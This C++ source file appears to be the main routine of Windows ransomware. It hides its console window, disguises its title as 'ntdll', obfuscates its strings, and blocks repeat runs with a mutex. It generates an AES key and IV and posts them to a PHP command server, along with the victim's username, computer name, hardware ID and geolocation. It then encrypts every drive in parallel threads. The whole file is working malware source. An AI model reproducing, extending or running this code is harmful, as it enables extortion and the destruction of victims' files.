#include <iostream>
#include <thread>
#include <iomanip>
#include <fstream>
#include <sstream>

#include <cryptopp/aes.h>
#include <cryptopp/osrng.h>
#include <cryptopp/filters.h>
#include <cryptopp/hex.h>

#include "headers.h"
#include "systeme.h"
#include "diskEncryptor.h"
#include "http.h"
#include "toolkit.h"



int main(void) {
	::ShowWindow(::GetConsoleWindow(), DEBUG);
	::SetConsoleTitleA(AY_OBFUSCATE("ntdll"));

	HANDLE hMutex = CreateMutexA(NULL, TRUE, AY_OBFUSCATE("b29wc2llIHRoYXRzIHNhZCBmb3IgeW91IF5e"));
	if (ERROR_ALREADY_EXISTS == GetLastError()) {
		return 1;
	}

	Systeme sys;
	std::string username = sys.getUsername();

	/*

	std::string path = ("C:\\Users\\") + username + "\\AppData\\Roaming\\check.U3AZqJX";
	std::ifstream hasAlready(path);
	if (hasAlready.is_open()) {
		hasAlready.close();
		return 1;
	}
	std::ofstream checkFile(path);
	if (!checkFile.is_open()) {
		return 1;
	}
	checkFile << CHECK_KEY;
	checkFile.close();
	*/

	CryptoPP::AutoSeededRandomPool prng;
	CryptoPP::SecByteBlock  key(CryptoPP::AES::DEFAULT_KEYLENGTH);
	CryptoPP::SecByteBlock  iv(CryptoPP::AES::BLOCKSIZE);

	prng.GenerateBlock(key.data(), key.size());
	prng.GenerateBlock(iv.data(), iv.size());

	std::map<int, std::string> data = sys.getLocalization();
	std::string ddzdzjd;
	std::string dbhzgdzdgzm;
	CryptoPP::StringSource(key.data(), key.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(ddzdzjd)));
	CryptoPP::StringSource(iv.data(), iv.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(dbhzgdzdgzm)));
	std::string query = "uuid=" + sys.getHwId() + "&username=" + sys.getUsername() + "&computername=" + sys.getComputerName() + "&langId=" + std::to_string(sys.getLangId()) +
		"&country=" + data[0] + "&region=" + data[3] + "&city=" + data[1] + "&latlong=" + data[2] + "&osversion=" + std::to_string(sys.getOsVersion()) +
		"&key=" + ddzdzjd + "&iv=" + dbhzgdzdgzm;
	std::cout << query << std::endl;
	Http http(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
	http.SendPostRequest(L"localhost", L"/server/hdhohzuag.php?action=add", L"Content-Type: application/x-www-form-urlencoded", to_wstring(query));
	std::string response = http.GetResponseText();
	std::cout << response << std::endl;
	

	std::vector<std::thread> threads;
	std::vector<DiskEncryptor> toEncrypt;
	
	std::vector<std::string> drives = sys.getDrives();

	

	for (auto& drive : drives) {
		DiskEncryptor diskEncryptor(drive, key, iv);
		toEncrypt.push_back(diskEncryptor);
	}
	for (auto& disk : toEncrypt) {
		threads.push_back(std::thread(&DiskEncryptor::iterateFiles, &disk));
	}
	for (std::thread& t : threads) {
		t.join();
	}
	
	return 0;
}